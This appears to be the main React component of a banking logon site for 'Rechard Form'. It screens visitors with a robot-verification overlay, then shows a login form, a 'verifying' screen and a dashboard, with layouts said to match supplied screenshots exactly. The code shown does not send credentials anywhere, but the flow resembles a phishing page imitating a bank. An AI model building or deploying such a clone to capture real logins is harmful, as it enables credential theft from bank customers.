import { useState } from 'react';
import { Header } from './components/Header';
import { LogonForm } from './components/LogonForm';
import { Sidebar } from './components/Sidebar';
import { MobileAppPromo } from './components/MobileAppPromo';
import { Footer } from './components/Footer';
import { DashboardView } from './components/DashboardView';
import { VerifyingScreen } from './components/VerifyingScreen';
import { RobotVerificationModal } from './components/RobotVerification';
import { Lock, ShieldCheck, X, AlertTriangle } from 'lucide-react';

export default function App() {
  const [appState, setAppState] = useState<'robot_check' | 'login' | 'verifying' | 'dashboard'>('robot_check');
  const [currentUser, setCurrentUser] = useState<string>('L09482103');
  const [securityModalOpen, setSecurityModalOpen] = useState(false);

  // Inactive links simply do nothing (toast removed as requested)
  const handleLinkClick = () => {
    // No popup alert
  };

  const handleLoginSubmit = (userId: string) => {
    setCurrentUser(userId);
    setAppState('verifying');
  };

  const handleFinishVerification = () => {
    setAppState('dashboard');
  };

  const handleBackToLogin = () => {
    setAppState('login');
  };

  // State 1: Verification Loading Screen (Screenshot 2 requested by user)
  if (appState === 'verifying') {
    return (
      <>
        <VerifyingScreen
          userId={currentUser}
          onLinkClick={handleLinkClick}
          onOpenSecurityModal={() => setSecurityModalOpen(true)}
          onFinishVerification={handleFinishVerification}
          onBackToLogin={handleBackToLogin}
        />



        {/* Security Info Modal */}
        {securityModalOpen && (
          <SecurityModal onClose={() => setSecurityModalOpen(false)} />
        )}
      </>
    );
  }

  // State 2: Authenticated Personal Banking Dashboard
  if (appState === 'dashboard') {
    return (
      <>
        <DashboardView
          userId={currentUser}
          onLogOff={handleBackToLogin}
          onLinkClick={handleLinkClick}
        />


      </>
    );
  }

  // State 3: Main Login Screen with Robot Verification Modal Overlay (Screenshot verifa_cbdc0cb2.jpg)
  return (
    <div style={{ position: 'relative', minHeight: '100vh', backgroundColor: '#ffffff' }}>
      {/* Robot Verification Modal Overlay (Exact match to screenshot verifa_cbdc0cb2.jpg) */}
      {appState === 'robot_check' && (
        <RobotVerificationModal onVerifySuccess={() => setAppState('login')} />
      )}

      {/* Main Page Container (Blurred when verification is active) */}
      <div
        className={appState === 'robot_check' ? 'rf-blurred' : ''}
        style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column' }}
      >
        {/* Top Header */}
        <Header
          onLinkClick={handleLinkClick}
          onOpenSecurityModal={() => setSecurityModalOpen(true)}
        />

        {/* Main Content Area */}
        <main className="rf-main-wrapper">
          {/* Left Column: Form & Promo */}
          <div>
            <LogonForm
              onLinkClick={handleLinkClick}
              onSuccessLogin={handleLoginSubmit}
            />

            <div className="rf-desktop-only" style={{ marginTop: '36px' }}>
              <MobileAppPromo onLinkClick={handleLinkClick} />
            </div>
          </div>

          {/* Right Column: Help, Contact & Protection Cards (Desktop only) */}
          <div className="rf-desktop-only">
            <Sidebar onLinkClick={handleLinkClick} />
          </div>
        </main>

        {/* Footer */}
        <Footer onLinkClick={handleLinkClick} />
      </div>



      {/* Security Info Modal */}
      {securityModalOpen && (
        <SecurityModal onClose={() => setSecurityModalOpen(false)} />
      )}
    </div>
  );
}

function SecurityModal({ onClose }: { onClose: () => void }) {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
      <div className="bg-white max-w-lg w-full p-6 sm:p-7 shadow-2xl border border-slate-300 relative">
        <button
          type="button"
          onClick={onClose}
          className="absolute top-4 right-4 text-slate-400 hover:text-slate-700 cursor-pointer"
        >
          <X className="w-5 h-5" />
        </button>

        <div className="flex items-center gap-3 text-[#006a4e] font-bold text-lg mb-4">
          <ShieldCheck className="w-6 h-6 flex-shrink-0" />
          <span>How to tell this site is secure</span>
        </div>

        <div className="space-y-3.5 text-xs sm:text-sm text-slate-700 leading-relaxed">
          <div className="flex items-start gap-2.5">
            <Lock className="w-4 h-4 text-[#006a4e] flex-shrink-0 mt-0.5" />
            <p>
              <strong>Look for the padlock symbol:</strong> In your browser address bar, check that the connection begins with <code>https://</code> and displays a secure padlock.
            </p>
          </div>
          <div className="flex items-start gap-2.5">
            <ShieldCheck className="w-4 h-4 text-[#006a4e] flex-shrink-0 mt-0.5" />
            <p>
              <strong>Check the web address:</strong> Ensure you are visiting an authentic domain before submitting your confidential logon details.
            </p>
          </div>
            <div className="flex items-start gap-2.5">
              <AlertTriangle className="w-4 h-4 text-amber-600 flex-shrink-0 mt-0.5" />
              <p>
                <strong>Keep credentials secure:</strong> Rechard Form will never ask for your full password or security PIN in an unsolicited email or message.
              </p>
            </div>
        </div>

        <div className="mt-6 pt-4 border-t border-slate-200 text-right">
          <button
            type="button"
            onClick={onClose}
            className="bg-[#006a4e] text-white px-6 py-2 text-sm font-semibold hover:bg-[#00543e] transition-colors cursor-pointer"
          >
            Understood
          </button>
        </div>
      </div>
    </div>
  );
}
